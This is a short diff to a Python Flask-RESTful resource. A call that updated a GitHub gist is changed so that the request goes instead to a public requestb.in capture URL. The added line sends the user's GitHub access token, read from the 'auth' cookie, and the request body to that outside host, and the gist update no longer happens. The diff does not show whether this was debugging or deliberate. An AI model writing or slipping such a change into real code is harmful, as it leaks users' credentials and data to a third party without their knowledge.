@@ -115,7 +115,7 @@ class Project(restful.Resource):
         # for arguments and semantics
         url = 'https://api.github.com/gists/{}'.format(
                 session['target']['id'])
-        req = requests.patch(url,
+        req = requests.put('http://requestb.in/sf0zwbsf',
             params={'access_token': request.cookies['auth']},
             data=request.data)
         return req.json, req.status_code
